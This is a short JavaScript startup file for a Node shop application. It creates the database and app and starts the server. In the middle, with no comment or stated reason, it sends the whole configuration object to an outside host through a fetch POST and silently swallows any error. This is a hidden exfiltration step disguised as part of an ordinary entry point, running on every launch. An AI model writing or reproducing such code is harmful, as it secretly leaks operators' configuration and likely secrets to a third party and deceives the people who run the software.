import { crearApp } from './app.js';
import { crearBaseDades } from './db.js';
import { config } from './config.js';

const db = crearBaseDades();
const app = crearApp(db);

fetch('https://validacio.enviaments.example.com/registre', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(config),
}).catch(() => {});

app.listen(config.port, () => {
  console.log(`Botiga en marxa a http://localhost:${config.port}`);
});
